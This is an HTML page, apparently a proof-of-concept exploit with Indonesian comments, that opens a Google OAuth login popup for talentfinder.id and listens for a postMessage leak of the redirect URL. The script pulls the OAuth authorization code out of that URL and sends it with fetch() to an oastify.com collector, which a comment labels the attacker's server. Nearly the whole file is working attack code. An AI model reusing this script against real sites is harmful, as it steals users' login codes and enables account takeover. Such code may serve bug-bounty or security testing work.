<!doctype html>
<html>
<body>

<button onclick="start()">Login OAuth</button>

<script>

function start() {

    // buka popup OAuth
    window.open(
      "https://accounts.google.com/o/oauth2/auth?response_type=code,id_token&redirect_uri=http%3A%2F%2Ftalentfinder.id%2Fapplication%2Flogin%2Fgoogle.php&client_id=387722121931-kas65ot5rtre0c96hund00aeopcb7rgo.apps.googleusercontent.com&scope=openid+email+profile&access_type=offline&approval_prompt=force",
      "_blank"
    );

}

// listener buat nerima postMessage
window.addEventListener("message", function(event) {

    console.log("DATA MASUK:");
    console.log(event.data);

    // ambil URL yang bocor
    let leaked = event.data.url;

    // parse query
    let url = new URL(leaked);

    // ambil oauth code
    let code = url.searchParams.get("code");

    console.log("OAUTH CODE =", code);

    // kirim ke server attacker
    fetch("https://ej1z4uqofpfykbkal4suxh355wbnzfn4.oastify.com/log?code=" + encodeURIComponent(code));

});

</script>

</body>
</html>
